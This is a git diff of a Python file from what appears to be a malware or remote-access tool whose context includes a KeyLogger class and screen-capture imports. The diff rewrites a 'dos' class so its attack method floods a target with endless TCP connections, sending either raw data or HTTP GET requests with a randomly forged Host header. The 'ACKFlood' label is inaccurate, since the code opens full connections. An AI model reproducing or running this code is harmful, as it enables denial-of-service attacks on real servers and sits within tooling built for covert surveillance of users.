@@ -19,7 +19,7 @@ import socket
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
 from PIL import ImageGrab
-
+import random
 
 class KeyLogger:
     '''this class is for keylogger utility , you should only start this class from a threading object.
@@ -63,21 +63,31 @@ class ScheduleManagement:
             self.listOfSchedules.pop(self.command)
 
 class dos:
-    def __init__(self,target,port,data,howmany):
+    def __init__(self,target,port,data,dostype):
         self.target  = target
         self.port    = port
         self.data    = data 
-        self.howmany = howmany
+        self.dostype = dostype
 
     
     def attack(self):
-        for i in range(0,self.howmany):
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((self.target, self.port))
-            s.sendto(
-                (self.byte), (self.target, self.port)
-            )
-            s.close()
+        if self.dostype == "ACKFlood":
+            while True:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.target, self.port))
+                s.sendto(
+                    (self.data), (self.target, self.port)
+                )
+                s.close()
+        else:
+            fakeip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
+            while True:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.target, self.port))
+                s.sendto(("GET / " + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
+                s.sendto(("Host: " + fakeip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
+                s.close()
+            
             
 
 
@@ -98,6 +108,7 @@ def get_host_name_ip() -> str:
 
 def get_my_global_ip() -> str:
     '''return system ip (3 API server)'''
+    
     try:
         return get_my_ip_server_1()
 
